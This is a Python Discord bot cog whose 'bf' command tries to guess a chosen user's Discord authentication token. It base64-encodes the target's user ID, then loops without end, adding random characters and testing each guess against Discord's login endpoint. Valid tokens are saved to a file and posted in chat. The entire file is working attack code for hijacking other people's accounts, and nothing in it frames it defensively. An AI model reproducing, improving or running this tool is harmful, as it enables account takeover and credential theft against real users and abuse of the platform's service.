import base64
import random
import string
import requests
from discord.ext import commands
from colorama import Fore
import asyncio

class IDToTokenCog(commands.Cog):
    def __init__(self, bot):
        self.bot = bot

    @commands.command()
    async def bf(self, ctx, *, user_id: str):
        """
        Convert ID to token and check its validity.
        Usage: !identify <ID>
        """
        id_to_token = base64.b64encode(user_id.encode("ascii")).decode("ascii")
        
        await ctx.send("Starting token validation...")

        while True:  # Keep trying until a valid token is found
            token = id_to_token + '.' + ''.join(random.choices(string.ascii_letters + string.digits, k=4)) + '.' + ''.join(random.choices(string.ascii_letters + string.digits, k=25))
            headers = {
                'Authorization': token
            }
            login = requests.get('https://discordapp.com/api/v9/auth/login', headers=headers)

            if login.status_code == 200:
                print(Fore.GREEN + '[+] VALID' + ' ' + token)
                with open('hit.txt', "a+") as f:
                    f.write(f'{token}\n')
                await ctx.send(f"Token checked: {token} - VALID")
                break  # Exit the loop on valid token
            else:
                print(Fore.RED + '[-] INVALID' + ' ' + token)
                await ctx.send(f"Token checked: {token} - INVALID")

            await asyncio.sleep(0.2)  # Wait for 0.5 seconds before the next attempt


async def setup(bot):
    await bot.add_cog(IDToTokenCog(bot))
